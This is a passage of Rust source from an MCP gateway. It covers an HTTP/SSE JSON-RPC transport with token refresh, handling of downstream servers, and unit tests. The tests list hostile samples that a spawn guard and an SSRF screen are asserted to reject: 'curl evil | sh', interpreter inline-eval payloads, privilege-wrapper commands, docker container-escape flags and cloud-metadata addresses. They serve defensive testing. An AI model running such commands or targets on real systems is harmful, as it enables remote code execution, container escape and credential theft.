    /// POST JSON-RPC without waiting for a response body (inline replies mid-SSE).
    fn send_post_no_response(&mut self, body: &Value) -> Result<(), TransportError> {
        let payload = body.to_string();
        self.refresh_before_send();
        let mut refreshed = false;
        let resp = loop {
            let mut req = self
                .inline_agent
                .post(&self.url)
                .set("Content-Type", "application/json")
                .set("Accept", "application/json, text/event-stream")
                .set("MCP-Protocol-Version", PROTOCOL_VERSION);
            if let Some(sid) = &self.session_id {
                req = req.set("Mcp-Session-Id", sid);
            }
            if let Some(token) = &self.auth {
                req = req.set("Authorization", &bearer_header(token));
            }
            match req.send_string(&payload) {
                Ok(resp) => break resp,
                Err(ureq::Error::Status(code, resp))
                    if (code == 401 || code == 403)
                        && !refreshed
                        && self.refresh.is_some() =>
                {
                    let _ = read_capped(resp, 8 * 1024);
                    refreshed = true;
                    self.force_refresh_after_auth_error(code)?;
                }
                Err(e) => return Err(TransportError::Fatal(e.to_string())),
            }
        };
        if let Some(sid) = resp.header("Mcp-Session-Id") {
            self.session_id = Some(sid.to_string());
        }
        // Drain so the connection returns to the pool without leaving bytes unread.
        let _ = read_capped(resp, 64 * 1024);
        Ok(())
    }

    /// Read SSE `data:` frames as they arrive so server-initiated requests can be
    /// answered before the downstream closes the stream (avoids deadlock when the
    /// server waits for our inline reply before sending the final response).
    fn read_sse_response(
        &mut self,
        resp: ureq::Response,
        wanted: Option<&Value>,
    ) -> Result<Option<Value>, TransportError> {
        use std::io::{BufRead, BufReader, Read};
        let mut reader = BufReader::new(resp.into_reader().take(MAX_RESPONSE_BYTES + 1));
        let mut line = String::new();
        let mut bytes_read: u64 = 0;
        loop {
            line.clear();
            let n = reader
                .read_line(&mut line)
                .map_err(|e| TransportError::Fatal(e.to_string()))?;
            if n == 0 {
                break;
            }
            bytes_read += n as u64;
            if bytes_read > MAX_RESPONSE_BYTES {
                return Err(TransportError::Fatal(format!(
                    "SSE response exceeded {MAX_RESPONSE_BYTES} bytes"
                )));
            }
            let trimmed = line.trim_start();
            if let Some(data) = trimmed.strip_prefix("data:") {
                let data = data.trim();
                if data.is_empty() {
                    continue;
                }
                let Ok(v) = serde_json::from_str::<Value>(data) else {
                    continue;
                };
                if self.handle_inline_server_request(&v)? {
                    continue;
                }
                if ids_match(v.get("id"), wanted) {
                    return Ok(Some(v));
                }
            }
        }
        Err(TransportError::Fatal(
            "no matching message in SSE stream".to_string(),
        ))
    }

    fn post(&mut self, body: &Value, expect_response: bool) -> Result<Option<Value>, TransportError> {
        let payload = body.to_string();

        // Refresh shortly before the known expiry, including before initialize.
        // The callback keeps the deadline in memory, so this is a cheap no-op on
        // ordinary calls and only touches vaulted OAuth state when refresh is due.
        self.refresh_before_send();

        // Token refresh is handled internally (it doesn't sleep, so no lock
        // contention). Only 429 and transport-retry signals bubble up as
        // TransportError::Retry so the Router can sleep *outside* the lock.
        let mut refreshed = false;
        let resp = loop {
            let mut req = self
                .agent
                .post(&self.url)
                .set("Content-Type", "application/json")
                .set("Accept", "application/json, text/event-stream")
                .set("MCP-Protocol-Version", PROTOCOL_VERSION);
            if let Some(sid) = &self.session_id {
                req = req.set("Mcp-Session-Id", sid);
            }
            if let Some(token) = &self.auth {
                req = req.set("Authorization", &bearer_header(token));
            }

            match req.send_string(&payload) {
                Ok(r) => break r,
                // Rate limited: return a Retry signal so the Router sleeps
                // *outside* the per-server Mutex.
                Err(ureq::Error::Status(429, r)) => {
                    let retry_after = r.header("retry-after").and_then(retry_after_delay);
                    let _ = read_capped(r, 8 * 1024);
                    return Err(TransportError::Retry {
                        retry_after,
                        message: "HTTP 429: rate limited".to_string(),
                    });
                }
                // The access token likely expired: refresh it once and retry with
                // the new token, so a long-running session self-heals instead of
                // 401ing until the server is manually reconnected.
                Err(ureq::Error::Status(code, r))
                    if (code == 401 || code == 403) && !refreshed && self.refresh.is_some() =>
                {
                    let _ = read_capped(r, 8 * 1024);
                    refreshed = true;
                    self.force_refresh_after_auth_error(code)?;
                    continue;
                }
                Err(ureq::Error::Status(code, r)) => {
                    let detail: String = read_capped(r, 64 * 1024).chars().take(200).collect();
                    let hint = if code == 401 || code == 403 {
                        " (needs authentication)"
                    } else {
                        ""
                    };
                    return Err(TransportError::Fatal(format!("HTTP {code}{hint}: {detail}")));
                }
                // Transport error (DNS / connection failure): retryable, but
                // the Router owns the backoff sleep so the Mutex is released.
                Err(ureq::Error::Transport(t)) if is_retryable_transport(&t) => {
                    return Err(TransportError::Retry {
                        retry_after: None,
                        message: format!("transport error (retryable): {t}"),
                    });
                }
                Err(e) => return Err(TransportError::Fatal(e.to_string())),
            }
        };

        if let Some(sid) = resp.header("Mcp-Session-Id") {
            self.session_id = Some(sid.to_string());
        }
        if !expect_response {
            return Ok(None);
        }

        let is_sse = resp
            .header("content-type")
            .map(|c| c.to_lowercase().contains("text/event-stream"))
            .unwrap_or(false);
        let wanted = body.get("id").cloned();

        if is_sse {
            return self.read_sse_response(resp, wanted.as_ref());
        }

        let text = read_capped(resp, MAX_RESPONSE_BYTES);
        serde_json::from_str(&text)
            .map(Some)
            .map_err(|e| TransportError::Fatal(format!("bad JSON response: {e}")))
    }
}

impl Transport for HttpTransport {
    fn request(&mut self, method: &str, params: Value) -> Result<Value, TransportError> {
        let id = self.next_id;
        self.next_id += 1;
        let body = json!({ "jsonrpc": "2.0", "id": id, "method": method, "params": params });
        let resp = self.post(&body, true)?.ok_or_else(|| TransportError::Fatal("empty response".to_string()))?;
        if let Some(err) = resp.get("error") {
            return Err(TransportError::Fatal(err.to_string()));
        }
        Ok(resp.get("result").cloned().unwrap_or(Value::Null))
    }

    fn notify(&mut self, method: &str, params: Value) -> Result<(), TransportError> {
        let body = json!({ "jsonrpc": "2.0", "method": method, "params": params });
        self.post(&body, false)?;
        Ok(())
    }

    fn set_server_request_handler(&mut self, handler: ServerRequestHandler) {
        self.server_handler = Some(handler);
    }
}

/// One connected downstream server: its id, its transport, and its cached
/// tools, resources, and prompts.
pub struct DownstreamServer {
    pub id: String,
    transport: Box<dyn Transport>,
    pub tools: Vec<Value>,
    pub resources: Vec<Value>,
    pub prompts: Vec<Value>,
    /// Whether the server's `initialize` advertised resources / prompts. The
    /// actual lists are fetched lazily via `load_resources_prompts`.
    caps_resources: bool,
    caps_prompts: bool,
}

impl DownstreamServer {
    /// Handshake with the server and fetch its tool list. Resources and prompts
    /// are NOT fetched here - only whether the server advertises them is noted,
    /// so the health probe (which connects to every server in one batch) stays
    /// tools-only and fast and can't stall on a slow or hanging resources/prompts
    /// endpoint. The gateway calls `load_resources_prompts` to populate them.
    pub fn connect(id: String, mut transport: Box<dyn Transport>) -> Result<Self, String> {
        // Fail the handshake fast so one unresponsive server can't stall the whole
        // batch probe / router rebuild for the full live-call timeout. The transport
        // picks the budget: download-then-run launchers (npx, uvx, ...) get a long
        // first-`initialize` window because a cold cache means the package downloads
        // before the server can answer at all.
        let handshake_timeout = transport.connect_timeout();
        transport.set_read_timeout(handshake_timeout);
        let init = transport.request(
            "initialize",
            json!({
                "protocolVersion": PROTOCOL_VERSION,
                "capabilities": {},
                "clientInfo": { "name": "toolport-gateway", "version": env!("CARGO_PKG_VERSION") }
            }),
        ).map_err(|e| e.to_string())?;
        let caps = init.get("capabilities");
        let caps_resources = caps.and_then(|c| c.get("resources")).is_some();
        let caps_prompts = caps.and_then(|c| c.get("prompts")).is_some();
        transport.notify("notifications/initialized", json!({})).map_err(|e| e.to_string())?;

        // `initialize` answered, so any launcher download is done: the rest of the
        // handshake goes back to the tight budget - a server that comes up but then
        // hangs on `tools/list` should still fail in seconds.
        transport.set_read_timeout(STDIO_CONNECT_TIMEOUT);
        let result = transport.request("tools/list", json!({})).map_err(|e| e.to_string())?;
        let tools = extract_array(&result, "tools");

        // Restore the longer timeout: actual tool calls can legitimately be slow.
        transport.set_read_timeout(STDIO_READ_TIMEOUT);
        // Handshake done: from here on, react to the server's own tool-list
        // changes (ignored until now so a startup announcement is a no-op).
        transport.arm_tools_watch();

        Ok(DownstreamServer {
            id,
            transport,
            tools,
            resources: Vec::new(),
            prompts: Vec::new(),
            caps_resources,
            caps_prompts,
        })
    }

    /// Re-fetch the server's tool list on the existing connection, after it
    /// announced a `tools/list_changed`. Bounds the wait like the handshake so a
    /// hung server can't stall the refresh; on error the previous list is kept.
    pub fn refresh_tools(&mut self) {
        self.transport.set_read_timeout(STDIO_CONNECT_TIMEOUT);
        if let Ok(result) = self.transport.request("tools/list", json!({})) {
            self.tools = extract_array(&result, "tools");
        }
        self.transport.set_read_timeout(STDIO_READ_TIMEOUT);
    }

    /// Re-fetch the resource list on the existing connection after the server
    /// announced a `resources/list_changed`. Mirrors [`refresh_tools`]; best-effort
    /// (an error keeps the previous list), and a no-op if the server never
    /// advertised resources.
    pub fn refresh_resources(&mut self) {
        if !self.caps_resources {
            return;
        }
        self.transport.set_read_timeout(STDIO_CONNECT_TIMEOUT);
        if let Ok(r) = self.transport.request("resources/list", json!({})) {
            self.resources = extract_array(&r, "resources");
        }
        self.transport.set_read_timeout(STDIO_READ_TIMEOUT);
    }

    /// Re-fetch the prompt list on the existing connection after the server
    /// announced a `prompts/list_changed`. Mirrors [`refresh_tools`]; best-effort,
    /// and a no-op if the server never advertised prompts.
    pub fn refresh_prompts(&mut self) {
        if !self.caps_prompts {
            return;
        }
        self.transport.set_read_timeout(STDIO_CONNECT_TIMEOUT);
        if let Ok(r) = self.transport.request("prompts/list", json!({})) {
            self.prompts = extract_array(&r, "prompts");
        }
        self.transport.set_read_timeout(STDIO_READ_TIMEOUT);
    }

    /// Fetch the resources and prompts the server advertised. Best-effort: an
    /// error or empty response just leaves the list empty. Kept out of `connect`
    /// so only the gateway (which actually proxies these) pays the cost.
    pub fn load_resources_prompts(&mut self) {
        if self.caps_resources {
            if let Ok(r) = self.transport.request("resources/list", json!({})) {
                self.resources = extract_array(&r, "resources");
            }
        }
        if self.caps_prompts {
            if let Ok(r) = self.transport.request("prompts/list", json!({})) {
                self.prompts = extract_array(&r, "prompts");
            }
        }
    }

    pub fn call(&mut self, tool: &str, arguments: Value) -> Result<Value, TransportError> {
        self.call_with_cancel(tool, arguments, None)
    }

    pub fn call_with_cancel(
        &mut self,
        tool: &str,
        arguments: Value,
        cancel: Option<CancelContext>,
    ) -> Result<Value, TransportError> {
        self.transport.request_with_cancel(
            "tools/call",
            json!({ "name": tool, "arguments": arguments }),
            cancel,
        )
    }

    /// Read one resource by its (original, downstream) uri.
    pub fn read_resource(&mut self, uri: &str) -> Result<Value, TransportError> {
        self.read_resource_with_cancel(uri, None)
    }

    pub fn read_resource_with_cancel(
        &mut self,
        uri: &str,
        cancel: Option<CancelContext>,
    ) -> Result<Value, TransportError> {
        self.transport
            .request_with_cancel("resources/read", json!({ "uri": uri }), cancel)
    }

    /// Get one prompt by its (original, downstream) name.
    pub fn get_prompt(&mut self, name: &str, arguments: Value) -> Result<Value, TransportError> {
        self.get_prompt_with_cancel(name, arguments, None)
    }

    pub fn get_prompt_with_cancel(
        &mut self,
        name: &str,
        arguments: Value,
        cancel: Option<CancelContext>,
    ) -> Result<Value, TransportError> {
        self.transport.request_with_cancel(
            "prompts/get",
            json!({ "name": name, "arguments": arguments }),
            cancel,
        )
    }

    /// Forward a JSON-RPC notification to this downstream server.
    pub fn notify_downstream(&mut self, method: &str, params: Value) -> Result<(), TransportError> {
        self.transport.notify(method, params)
    }
}

/// Pull a named array field out of a JSON-RPC result, or an empty vec.
fn extract_array(result: &Value, key: &str) -> Vec<Value> {
    result
        .get(key)
        .and_then(|v| v.as_array())
        .cloned()
        .unwrap_or_default()
}

#[cfg(test)]
mod tests {
    use super::{
        expand_cwd, file_uri_to_path, resolve_command, resolve_root_token, screen_resolved_addrs,
        screen_spawn_command, screen_spawn_env, CancelRegistry,
    };
    use serde_json::json;

    #[test]
    fn expand_cwd_handles_tilde_and_env() {
        use std::path::PathBuf;
        // A unique var name so the process-wide set_var can't collide with a
        // parallel test.
        let var = format!("TP_TEST_CWD_{}", std::process::id());
        std::env::set_var(&var, "abc");
        assert_eq!(expand_cwd(&format!("/x/${{{var}}}/y")), PathBuf::from("/x/abc/y"));
        std::env::remove_var(&var);
        // An unset var expands to empty; a literal path is unchanged.
        assert_eq!(expand_cwd("/x/${TP_UNSET_ZZZ}/y"), PathBuf::from("/x//y"));
        assert_eq!(expand_cwd("/plain/path"), PathBuf::from("/plain/path"));
        // A leading `~` becomes the home dir.
        if let Some(home) = dirs::home_dir() {
            assert_eq!(expand_cwd("~"), home);
            assert_eq!(expand_cwd("~/proj"), home.join("proj"));
        }
    }

    #[test]
    fn strips_gateway_control_env_from_children() {
        use std::collections::HashSet;
        use std::ffi::OsStr;
        // pid-unique names so a parallel test's process-wide env set can't collide.
        let secret = format!("CONDUIT_TEST_SECRET_{}", std::process::id());
        let keep = format!("TP_KEEP_{}", std::process::id());
        std::env::set_var(&secret, "leak-me");
        std::env::set_var(&keep, "ok");

        // Nothing configured: the inherited CONDUIT_* var is marked for removal from
        // the child (get_envs records a removal as value None), and an unrelated var
        // is left untouched.
        let empty: HashSet<&str> = HashSet::new();
        let mut cmd = std::process::Command::new("true");
        super::strip_gateway_control_env(&mut cmd, &empty);
        let overrides: Vec<_> = cmd.get_envs().collect();
        assert!(
            overrides.iter().any(|(k, v)| *k == OsStr::new(&secret) && v.is_none()),
            "a CONDUIT_* var must be stripped from the child"
        );
        assert!(
            !overrides.iter().any(|(k, _)| *k == OsStr::new(&keep)),
            "an unrelated var must not be touched by the strip"
        );

        // A server that sets a CONDUIT_ var for itself keeps it (exempt from the strip).
        let configured: HashSet<&str> = [secret.as_str()].into_iter().collect();
        let mut cmd2 = std::process::Command::new("true");
        super::strip_gateway_control_env(&mut cmd2, &configured);
        assert!(
            !cmd2.get_envs().any(|(k, _)| k == OsStr::new(&secret)),
            "a server-configured CONDUIT_ var must be exempt from the strip"
        );

        std::env::remove_var(&secret);
        std::env::remove_var(&keep);
    }

    #[test]
    fn resolve_root_token_substitutes_and_falls_back() {
        // Blank -> None (inherit the gateway cwd).
        assert_eq!(resolve_root_token("", Some("/proj")), None);
        assert_eq!(resolve_root_token("   ", Some("/proj")), None);
        // ${ROOT} with a known root -> substituted.
        assert_eq!(resolve_root_token("${ROOT}", Some("/home/u/proj")), Some("/home/u/proj".into()));
        assert_eq!(
            resolve_root_token("${ROOT}/sub", Some("/home/u/proj")),
            Some("/home/u/proj/sub".into())
        );
        // ${ROOT} with no known root -> None (fall back, never a literal ${ROOT}).
        assert_eq!(resolve_root_token("${ROOT}/sub", None), None);
        // No ${ROOT} -> the trimmed config, regardless of root.
        assert_eq!(resolve_root_token("/plain", None), Some("/plain".into()));
        assert_eq!(resolve_root_token("  /plain  ", Some("/proj")), Some("/plain".into()));
        // Composes with expand_cwd: an un-touched ${VAR} survives for expand_cwd.
        assert_eq!(resolve_root_token("${ROOT}/${SUB}", Some("/proj")), Some("/proj/${SUB}".into()));
    }

    #[test]
    fn file_uri_to_path_decodes_platform_paths() {
        use std::path::PathBuf;
        // Non-file / unparseable -> None.
        assert_eq!(file_uri_to_path("https://example.com/x"), None);
        assert_eq!(file_uri_to_path("not a uri"), None);
        // Compare as PathBuf so `/` vs `\` separators don't make the test brittle.
        let as_path = |u: &str| file_uri_to_path(u).map(PathBuf::from);
        #[cfg(not(windows))]
        {
            assert_eq!(as_path("file:///home/u/proj"), Some(PathBuf::from("/home/u/proj")));
            assert_eq!(as_path("file:///home/u/my%20proj"), Some(PathBuf::from("/home/u/my proj")));
        }
        #[cfg(windows)]
        {
            assert_eq!(as_path("file:///C:/Users/u/proj"), Some(PathBuf::from(r"C:\Users\u\proj")));
            assert_eq!(
                as_path("file:///C:/Users/u/my%20proj"),
                Some(PathBuf::from(r"C:\Users\u\my proj"))
            );
        }
    }

    #[test]
    fn download_launchers_get_the_long_connect_budget() {
        use super::{stdio_connect_timeout, LAUNCHER_CONNECT_TIMEOUT};
        let a = |v: &[&str]| v.iter().map(|s| s.to_string()).collect::<Vec<_>>();
        // Bare launchers, wherever they live and however Windows shims them.
        for cmd in [
            "npx",
            "uvx",
            "bunx",
            "/usr/local/bin/npx",
            r"C:\Program Files\nodejs\npx.cmd",
            "NPX.EXE",
            "uvx.exe",
        ] {
            assert_eq!(
                stdio_connect_timeout(cmd, &a(&["-y", "@scope/pkg"])),
                LAUNCHER_CONNECT_TIMEOUT,
                "{cmd} should get the launcher budget"
            );
        }
        // Package managers count only in their download-then-run form.
        for (cmd, args) in [
            ("pnpm", vec!["dlx", "some-mcp"]),
            ("yarn", vec!["dlx", "some-mcp"]),
            ("npm", vec!["exec", "some-mcp"]),
            ("npm", vec!["x", "some-mcp"]),
            ("pipx", vec!["run", "some-mcp"]),
        ] {
            assert_eq!(
                stdio_connect_timeout(cmd, &a(&args)),
                LAUNCHER_CONNECT_TIMEOUT,
                "{cmd} {args:?} should get the launcher budget"
            );
        }
        // A config that packed the whole invocation into `command` is normalized
        // the same way the spawn path does before matching.
        assert_eq!(
            stdio_connect_timeout("npx -y @scope/pkg", &[]),
            LAUNCHER_CONNECT_TIMEOUT
        );
    }

    #[test]
    fn ordinary_commands_keep_the_tight_connect_budget() {
        use super::{stdio_connect_timeout, STDIO_CONNECT_TIMEOUT};
        let a = |v: &[&str]| v.iter().map(|s| s.to_string()).collect::<Vec<_>>();
        for (cmd, args) in [
            // Already-installed runtimes: nothing to download, fail fast.
            ("node", vec!["server.js"]),
            ("python", vec!["-m", "some_mcp"]),
            ("docker", vec!["run", "npx"]), // launcher name in args is not a launcher
            (r"C:\tools\my-server.exe", vec![]),
            // Package managers running an existing project, not fetching one.
            ("pnpm", vec!["run", "start"]),
            ("yarn", vec!["start"]),
            ("npm", vec!["start"]),
            ("pipx", vec![]),
            // A path that merely contains a launcher-ish segment.
            ("/opt/npx-tools/server", vec![]),
        ] {
            assert_eq!(
                stdio_connect_timeout(cmd, &a(&args)),
                STDIO_CONNECT_TIMEOUT,
                "{cmd} {args:?} should keep the tight budget"
            );
        }
    }

    #[test]
    fn is_server_initiated_request_detects_downstream_rpc() {
        let req = json!({"jsonrpc":"2.0","id":1,"method":"roots/list"});
        assert!(super::is_server_initiated_request(&req));
        let resp = json!({"jsonrpc":"2.0","id":1,"result":{"roots":[]}});
        assert!(!super::is_server_initiated_request(&resp));
        let note = json!({"jsonrpc":"2.0","method":"notifications/tools/list_changed"});
        assert!(!super::is_server_initiated_request(&note));
    }

    #[test]
    fn http_sse_answers_inline_server_request_before_final_response() {
        use super::{HttpTransport, RefreshFn, ServerRequestHandler, Transport};
        use serde_json::Value;
        use std::io::{Read, Write};
        use std::net::TcpListener;
        use std::sync::atomic::{AtomicUsize, Ordering};
        use std::sync::Arc;

        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        listener.set_nonblocking(false).unwrap();
        let port = listener.local_addr().unwrap().port();
        let server_handle = std::thread::spawn(move || {
            let mut sse = listener.accept().unwrap().0;
            let headers = read_http_headers(&mut sse);
            if headers
                .windows(b"expect: 100-continue".len())
                .any(|w| w.eq_ignore_ascii_case(b"expect: 100-continue"))
            {
                sse.write_all(b"HTTP/1.1 100 Continue\r\n\r\n").unwrap();
            }
            if let Some(len) = content_length(&headers) {
                let mut body = vec![0u8; len];
                sse.read_exact(&mut body).unwrap();
            }

            let line1 = "data: {\"jsonrpc\":\"2.0\",\"id\":99,\"method\":\"roots/list\"}\n";
            sse.write_all(
                b"HTTP/1.1 200 OK\r\nContent-Type: text/event-stream\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n",
            )
            .unwrap();
            write_chunk(&mut sse, line1.as_bytes());

            let mut inline = listener.accept().unwrap().0;
            let inline_headers = read_http_headers(&mut inline);
            assert!(String::from_utf8_lossy(&inline_headers)
                .to_ascii_lowercase()
                .contains("authorization: bearer fresh"));
            let mut body = String::new();
            if let Some(len) = content_length(&inline_headers) {
                let mut raw = vec![0u8; len];
                inline.read_exact(&mut raw).unwrap();
                body = String::from_utf8_lossy(&raw).into_owned();
            }
            assert!(body.contains("\"id\":99"));
            inline
                .write_all(b"HTTP/1.1 202 Accepted\r\nContent-Length: 2\r\nConnection: close\r\n\r\n{}")
                .unwrap();

            let line2 = "data: {\"jsonrpc\":\"2.0\",\"id\":1,\"result\":{\"ok\":true}}\n";
            write_chunk(&mut sse, line2.as_bytes());
            sse.write_all(b"0\r\n\r\n").unwrap();
        });


        fn read_http_headers(r: &mut impl Read) -> Vec<u8> {
            let mut req_buf = Vec::new();
            let mut byte = [0u8; 1];
            while r.read(&mut byte).unwrap() > 0 {
                req_buf.push(byte[0]);
                if req_buf.len() >= 4 && &req_buf[req_buf.len() - 4..] == b"\r\n\r\n" {
                    break;
                }
            }
            req_buf
        }

        fn content_length(headers: &[u8]) -> Option<usize> {
            let headers = String::from_utf8_lossy(headers);
            for line in headers.lines() {
                if let Some(v) = line.strip_prefix("Content-Length:").or_else(|| line.strip_prefix("content-length:")) {
                    return v.trim().parse().ok();
                }
            }
            None
        }

        fn write_chunk(w: &mut impl Write, data: &[u8]) {
            write!(w, "{:x}\r\n", data.len()).unwrap();
            w.write_all(data).unwrap();
            w.write_all(b"\r\n").unwrap();
            w.flush().unwrap();
        }

        let handler: ServerRequestHandler = Arc::new(|req| {
            if req.get("method").and_then(|m| m.as_str()) == Some("roots/list") {
                Some(json!({
                    "jsonrpc": "2.0",
                    "id": req.get("id").cloned().unwrap_or(Value::Null),
                    "result": { "roots": [] }
                }))
            } else {
                None
            }
        });
        let url = format!("http://127.0.0.1:{port}/");
        let refresh_calls = Arc::new(AtomicUsize::new(0));
        let calls = Arc::clone(&refresh_calls);
        let refresh: Option<RefreshFn> = Some(Box::new(move |force| {
            assert!(!force);
            if calls.fetch_add(1, Ordering::SeqCst) == 1 {
                Ok(Some("fresh".to_string()))
            } else {
                Ok(None)
            }
        }));
        let mut t =
            HttpTransport::with_auth_refresh(&url, Some("stale".to_string()), refresh);
        t.set_server_request_handler(handler);
        let result = t
            .post(
                &json!({ "jsonrpc": "2.0", "id": 1, "method": "tools/call" }),
                true,
            )
            .expect("inline reply should unblock the SSE stream");
        server_handle.join().unwrap();
        assert_eq!(refresh_calls.load(Ordering::SeqCst), 2);
        assert_eq!(
            result
                .and_then(|v| v.get("result").cloned())
                .unwrap_or(Value::Null),
            json!({"ok": true})
        );
    }


    #[test]
    fn ssrf_resolver_screens_resolved_addresses() {
        use std::net::SocketAddr;
        let p = |s: &str| s.parse::<SocketAddr>().unwrap();
        let metadata = p("169.254.169.254:80"); // AWS/GCP/Azure v4 metadata
        let aws_v6 = p("[fd00:ec2::254]:80"); // AWS v6 metadata (ULA)
        let mapped_v6 = p("[::ffff:169.254.169.254]:80"); // IPv4-mapped metadata
        let private = p("10.0.0.1:80");
        let loopback = p("127.0.0.1:80");
        let public = p("8.8.8.8:443");

        // Link-local / cloud-metadata is refused regardless of block_private.
        for a in [metadata, aws_v6, mapped_v6] {
            assert!(screen_resolved_addrs(&[a], false).is_err());
            assert!(screen_resolved_addrs(&[a], true).is_err());
        }
        // Private/loopback: allowed for trusted servers, refused for untrusted ones.
        for a in [private, loopback] {
            assert!(screen_resolved_addrs(&[a], false).is_ok());
            assert!(screen_resolved_addrs(&[a], true).is_err());
        }
        // A public address is always allowed.
        assert!(screen_resolved_addrs(&[public], false).is_ok());
        assert!(screen_resolved_addrs(&[public], true).is_ok());
        // Fail-closed: a rebind answer mixing public + metadata is refused whole, so
        // the internal IP can't be reached even alongside a benign one.
        assert!(screen_resolved_addrs(&[public, metadata], false).is_err());
        assert!(screen_resolved_addrs(&[public, metadata], true).is_err());
    }

    #[test]
    fn paths_with_extension_pass_through() {
        assert_eq!(resolve_command("C:\\tools\\foo.exe"), "C:\\tools\\foo.exe");
    }

    #[test]
    fn cancel_registry_tracks_active_requests() {
        let registry = CancelRegistry::new();
        assert!(!registry.cancel("7", Some("too slow")));

        assert!(registry.begin_client_request("7".to_string()));
        assert!(registry.cancel("7", Some("too slow")));
        assert!(registry.is_cancelled("7"));

        registry.finish_client_request("7");
        assert!(!registry.is_cancelled("7"));
        assert!(!registry.cancel("7", None));
    }

    #[test]
    fn cancel_registry_rejects_duplicate_active_ids() {
        let registry = CancelRegistry::new();
        assert!(registry.begin_client_request("7".to_string()));
        assert!(!registry.begin_client_request("7".to_string()));

        registry.finish_client_request("7");
        assert!(registry.begin_client_request("7".to_string()));
    }

    #[test]
    fn cancel_registry_persists_reason_for_deferred_forward() {
        let registry = CancelRegistry::new();
        assert!(registry.begin_client_request("7".to_string()));
        assert!(registry.cancel("7", Some("too slow")));

        let state = registry
            .inner
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner);
        let cancelled = state.cancelled.get("7").expect("cancelled state");
        assert_eq!(cancelled.reason.as_deref(), Some("too slow"));
        assert!(!cancelled.forwarded);
    }

    fn argv(parts: &[&str]) -> Vec<String> {
        parts.iter().map(|s| s.to_string()).collect()
    }

    #[test]
    fn spawn_guard_allows_normal_mcp_launchers() {
        // The overwhelmingly common launchers must never be blocked.
        assert!(screen_spawn_command("npx", &argv(&["-y", "@some/mcp-server"])).is_ok());
        assert!(screen_spawn_command("uvx", &argv(&["some-mcp-server"])).is_ok());
        assert!(screen_spawn_command("node", &argv(&["server.js", "--port", "3000"])).is_ok());
        assert!(screen_spawn_command("python", &argv(&["-m", "my_server"])).is_ok());
        assert!(screen_spawn_command("python3", &argv(&["/opt/app/main.py"])).is_ok());
        // A docker server without escape flags is fine.
        assert!(screen_spawn_command("docker", &argv(&["run", "-i", "--rm", "ghcr.io/x/y"])).is_ok());
        // Non-host docker network must NOT be a false positive.
        assert!(screen_spawn_command("docker", &argv(&["run", "--network", "mynet", "img"])).is_ok());
        // A plain binary server.
        assert!(screen_spawn_command("/usr/local/bin/my-mcp", &argv(&["--stdio"])).is_ok());
    }

    #[test]
    fn spawn_guard_blocks_interpreter_inline_eval() {
        assert!(screen_spawn_command("node", &argv(&["-e", "require('child_process')"])).is_err());
        assert!(screen_spawn_command("node", &argv(&["--eval", "x"])).is_err());
        assert!(screen_spawn_command("node", &argv(&["--require", "./pwn.js", "server.js"])).is_err());
        assert!(screen_spawn_command("node", &argv(&["--import=./pwn.js", "server.js"])).is_err());
        assert!(screen_spawn_command("deno", &argv(&["eval", "-e", "x"])).is_err());
        assert!(screen_spawn_command("python", &argv(&["-c", "import os"])).is_err());
        assert!(screen_spawn_command("ruby", &argv(&["-e", "x"])).is_err());
        assert!(screen_spawn_command("bash", &argv(&["-c", "curl evil | sh"])).is_err());
        assert!(screen_spawn_command("sh", &argv(&["-c", "x"])).is_err());
        assert!(screen_spawn_command("pwsh", &argv(&["-Command", "x"])).is_err());
    }

    #[test]
    fn spawn_guard_blocks_attached_inline_eval() {
        // Scripting interpreters accept the code attached to the flag token, so the
        // whole payload is a single argv entry with no `=` to split on. A bare
        // equality check misses these; the guard must still block them.
        assert!(screen_spawn_command("python", &argv(&["-cimport os;os.system('x')"])).is_err());
        assert!(screen_spawn_command("python3", &argv(&["-cimport os"])).is_err());
        assert!(screen_spawn_command("ruby", &argv(&["-eputs 1"])).is_err());
        assert!(screen_spawn_command("perl", &argv(&["-eprint 1"])).is_err());
        assert!(screen_spawn_command("php", &argv(&["-rphpinfo();"])).is_err());
        // Case-insensitive on the attached form too.
        assert!(screen_spawn_command("PYTHON", &argv(&["-Cimport os"])).is_err());
        // A bare `-c` with the code as the next token stays blocked (regression).
        assert!(screen_spawn_command("python", &argv(&["-c", "import os"])).is_err());
        // Non-eval short flags that merely start with the same letter are still fine.
        assert!(screen_spawn_command("python", &argv(&["-m", "my_server"])).is_ok());
        assert!(screen_spawn_command("my-server", &argv(&["-config.json"])).is_ok());
    }

    #[test]
    fn spawn_guard_blocks_container_escape() {
        // Privilege escalation beyond a normal host process is blocked.
        assert!(screen_spawn_command("docker", &argv(&["run", "--privileged", "img"])).is_err());
        assert!(screen_spawn_command("podman", &argv(&["run", "--cap-add", "SYS_ADMIN", "img"])).is_err());
        assert!(screen_spawn_command("docker", &argv(&["run", "--device", "/dev/kmsg", "img"])).is_err());
        // Host namespaces in both `=host` and space forms.
        assert!(screen_spawn_command("docker", &argv(&["run", "--network=host", "img"])).is_err());
        assert!(screen_spawn_command("docker", &argv(&["run", "--pid", "host", "img"])).is_err());
    }

    #[test]
    fn spawn_guard_allows_docker_volume_mounts() {
        // A plain host mount is NOT an escalation beyond the full host access npx/binary
        // servers already have, so it must not false-positive on legit docker servers.
        assert!(screen_spawn_command("docker", &argv(&["run", "-v", "/data:/data", "img"])).is_ok());
        assert!(screen_spawn_command("docker", &argv(&["run", "--volume", "/data:/data", "img"])).is_ok());
        assert!(screen_spawn_command("docker", &argv(&["run", "--mount", "type=bind,src=/data,dst=/d", "img"])).is_ok());
    }

    #[test]
    fn spawn_guard_is_case_and_path_insensitive() {
        // A full path and odd casing must still resolve to the interpreter name.
        assert!(screen_spawn_command("/usr/bin/node", &argv(&["-e", "x"])).is_err());
        assert!(screen_spawn_command("C:\\Program Files\\nodejs\\NODE.EXE", &argv(&["-E", "x"])).is_err());
        // A non-interpreter that merely has a `-e`-looking arg is untouched.
        assert!(screen_spawn_command("my-server", &argv(&["-e", "value"])).is_ok());
    }

    #[test]
    fn spawn_guard_rejects_wrapper_commands() {
        // Wrapper programs run the REAL command from their args, which would bypass the
        // basename dispatch. Refused outright, in any path form.
        for w in [
            "sudo", "doas", "su", "runuser", "pkexec", "time", "nice", "nohup", "xargs",
            "stdbuf", "timeout", "flock", "busybox", "proxychains", "chroot", "capsh",
            "firejail", "wine",
        ] {
            assert!(
                screen_spawn_command(w, &argv(&["node", "-e", "evil()"])).is_err(),
                "{w} wrapper should be refused"
            );
        }
    }

    #[test]
